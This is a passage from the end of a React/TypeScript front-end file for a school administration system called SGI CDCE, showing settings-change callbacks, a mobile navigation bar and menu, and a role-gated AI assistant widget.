                  onLogoChange={l => { const n={...systemSettings, customLogo: l}; setSystemSettings(n); saveData('settings', n); }} 
                  onBannerChange={b => { const n={...systemSettings, customBanner: b}; setSystemSettings(n); saveData('settings', n); }}
                  onAiEnabledChange={e => { const n={...systemSettings, aiEnabled: e}; setSystemSettings(n); saveData('settings', n); }}
                  onChatbotChange={e => { const n={...systemSettings, chatbotEnabled: e}; setSystemSettings(n); saveData('settings', n); }}
                  onStateNameChange={nm => { const n={...systemSettings, stateName: nm}; setSystemSettings(n); saveData('settings', n); }}
                  onCriteriaChange={c => { const n={...systemSettings, personnelCriteria: c}; setSystemSettings(n); saveData('settings', n); }}
                  onSelfRegisterChange={v => { const n={...systemSettings, allowPlantelSelfRegistration: v}; setSystemSettings(n); saveData('settings', n); }}
                  serverUrl={window.location.origin} isOnline={isOnline} allData={{ users, planteles, matricula, personal, rac, cnae, bienes, cuadratura, fundabit, fede, rendimiento, recursos, asistencia_diaria: asistenciaDiaria, comunicacion, eventos, audit_logs: auditLogs, settings: systemSettings }} 
                  onBulkImport={async (k, d) => { if (k === 'master-load') await handleBulkMaster(d); else await saveData(k, d); }} 
                  onHardReset={handleHardReset}
                />}
            </div>
        </main>

        {!isFullScreenMap && (
            <div className="lg:hidden fixed bottom-0 left-0 w-full bg-white border-t border-slate-200 z-[100] px-4 py-2 shadow-[0_-10px_40px_rgba(0,0,0,0.1)]">
                <div className="flex justify-between items-center">
                    <button onClick={() => setViewState({ currentView: 'dashboard' })} className={`flex flex-col items-center gap-1 p-2 rounded-xl transition-all ${viewState.currentView === 'dashboard' ? 'text-[#003399]' : 'text-slate-400'}`}>
                        <Home size={20} strokeWidth={viewState.currentView === 'dashboard' ? 3 : 2} />
                        <span className="text-[8px] font-black uppercase">Inicio</span>
                    </button>
                    <button onClick={() => setViewState({ currentView: 'planteles' })} className={`flex flex-col items-center gap-1 p-2 rounded-xl transition-all ${viewState.currentView === 'planteles' ? 'text-[#003399]' : 'text-slate-400'}`}>
                        <School size={20} strokeWidth={viewState.currentView === 'planteles' ? 3 : 2} />
                        <span className="text-[8px] font-black uppercase">Plantel</span>
                    </button>
                    <div className="relative -top-6">
                        <button onClick={() => setIsSidebarOpen(true)} className="bg-[#003399] text-white p-4 rounded-full shadow-xl border-4 border-slate-100 active:scale-90 transition-all">
                            <Grid size={24} />
                        </button>
                    </div>
                    <button onClick={() => setViewState({ currentView: 'reportes' })} className={`flex flex-col items-center gap-1 p-2 rounded-xl transition-all ${viewState.currentView === 'reportes' ? 'text-[#003399]' : 'text-slate-400'}`}>
                        <FileBarChart size={20} strokeWidth={viewState.currentView === 'reportes' ? 3 : 2} />
                        <span className="text-[8px] font-black uppercase">Reportes</span>
                    </button>
                    <button onClick={() => setViewState({ currentView: 'mensajeria' })} className={`flex flex-col items-center gap-1 p-2 rounded-xl transition-all ${viewState.currentView === 'mensajeria' ? 'text-[#003399]' : 'text-slate-400'}`}>
                        <MessageSquare size={20} strokeWidth={viewState.currentView === 'mensajeria' ? 3 : 2} />
                        <span className="text-[8px] font-black uppercase">Msj</span>
                    </button>
                </div>
            </div>
        )}

        {isSidebarOpen && window.innerWidth < 1024 && (
            <div className="fixed inset-0 z-[200] bg-slate-900/80 backdrop-blur-sm lg:hidden animate-in fade-in" onClick={() => setIsSidebarOpen(false)}>
                <div className="absolute bottom-0 left-0 w-full bg-slate-50 rounded-t-[40px] max-h-[80vh] overflow-y-auto p-6 animate-in slide-in-from-bottom duration-300" onClick={e => e.stopPropagation()}>
                    <div className="w-12 h-1.5 bg-slate-300 rounded-full mx-auto mb-6"></div>
                    <h3 className="font-black text-slate-800 uppercase text-lg mb-6 text-center">Menú de Gestión</h3>
                    <div className="grid grid-cols-3 gap-4">
                        {mobileMenuItems.map(item => (
                            <button 
                                key={item.id}
                                onClick={() => { 
                                    if(item.id === 'logout') setCurrentUser(null);
                                    else setViewState({ currentView: item.id as any });
                                    setIsSidebarOpen(false);
                                }}
                                className="flex flex-col items-center gap-3 p-4 bg-white rounded-3xl border border-slate-100 shadow-sm active:scale-95 transition-all"
                            >
                                <div className={`p-3 rounded-2xl ${item.color}`}>{item.icon}</div>
                                <span className="text-[10px] font-black uppercase text-slate-600 text-center leading-tight">{item.label}</span>
                            </button>
                        ))}
                    </div>
                </div>
            </div>
        )}
      </div>
      
      {!isFullScreenMap && (systemSettings.chatbotEnabled !== false) && (
          <AIAssistant 
            systemContext={`SGI CDCE Activo. Jurisdicción: ${currentUser?.municipioAsignado || "REGIONAL"}.`} 
            currentView={viewState.currentView} 
            aiEnabled={!!systemSettings.aiEnabled && (currentUser.role === 'MAESTRO' || !!currentUser.aiAuthorized)} 
            isOpen={isAiOpen}
            onToggle={setIsAiOpen}
          />
      )}
    </div>
  );
};

export default App;